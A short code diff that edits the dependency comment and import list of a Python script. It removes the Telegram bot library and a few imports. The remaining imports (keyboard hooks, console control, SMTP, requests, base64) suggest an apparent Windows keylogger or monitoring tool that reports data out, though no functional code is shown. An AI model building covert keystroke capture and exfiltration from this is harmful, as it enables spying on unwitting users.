@@ -31,7 +31,7 @@
 #
 #
 # Required:         Install with "pip install module-name-required"
-#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2, python-telegram-bot
+#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2
 #                   This list could be incomplete.
 #                   Install the necessary modules that are requested when executing the program.
 #
@@ -57,7 +57,7 @@
 
 import config_gm as config
 import argparse
-import atexit
+# import atexit
 import base64
 import datetime
 import getpass
@@ -69,15 +69,12 @@ import platform
 from smtplib import SMTP
 import pythoncom
 import pyWinhook as pyHook
-import re
 import requests
 import smtplib
 import socket
 import sys
-from telegram.ext import Updater, CommandHandler
 import tempfile
 import threading
-import time
 import urllib.parse
 import urllib.request
 import win32console
